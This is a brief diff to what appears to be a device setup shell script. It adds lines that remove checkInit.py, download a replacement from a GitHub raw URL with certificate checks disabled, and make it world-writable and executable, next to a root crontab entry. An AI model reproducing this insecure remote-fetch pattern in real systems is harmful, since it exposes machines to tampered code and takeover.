@@ -31,7 +31,10 @@ echo '00 12 * * * "unix"'>>/etc/crontabs/root
 
 #######################################
 
-
+rm checkInit.py
+sleep 5
+wget --no-check-certificate https://raw.githubusercontent.com/flukedf/perimetralFiles/master/checkInit.py
+chmod 777 checkInit.py
 
 
 
